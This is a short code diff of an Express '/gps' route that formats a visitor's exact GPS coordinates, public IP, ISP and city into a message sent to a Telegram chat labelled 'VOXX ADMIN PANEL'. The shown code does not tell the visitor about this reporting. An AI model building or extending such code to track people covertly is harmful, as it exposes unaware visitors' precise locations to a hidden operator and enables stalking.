@@ -48,17 +48,28 @@ router.post('/gps', async (req, res) => {
     const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
 
     await sendTelegram(
-`📍 VOXX ADMIN PANEL — EXACT GPS LOCATION
+`📍 <b>VOXX ADMIN PANEL — LOCATION REPORT</b>
 
-Coordinates: ${lat}, ${lng}
-Accuracy: ~${accuracy_meters ?? 'unknown'} meters
-Map: ${mapsUrl}
-IP: ${ip}
-ISP: ${loc.isp}
+🛰️ <b>GPS</b>
+• Latitude: <code>${lat}</code>
+• Longitude: <code>${lng}</code>
+• Accuracy: ±${accuracy_meters ?? "Unknown"} m
 
-Visitor Time: ${toLocalTime(new Date(), loc.timezone)}
-Your Time (IST): ${toIST(new Date())}`
-    );
+🗺️ <b>Maps</b>
+Google Maps:
+${mapsUrl}
+
+🌐 <b>Network</b>
+• Public IP: <code>${ip}</code>
+• ISP: ${loc.isp}
+• Country: ${loc.country}
+• State: ${loc.region}
+• City: ${loc.city}
+
+🕒 <b>Time</b>
+• Visitor: ${toLocalTime(new Date(), loc.timezone)}
+• Server (IST): ${toIST(new Date())}`
+);
     res.json({ ok: true });
   } catch (e) {
     console.error('/gps error:', e.message);
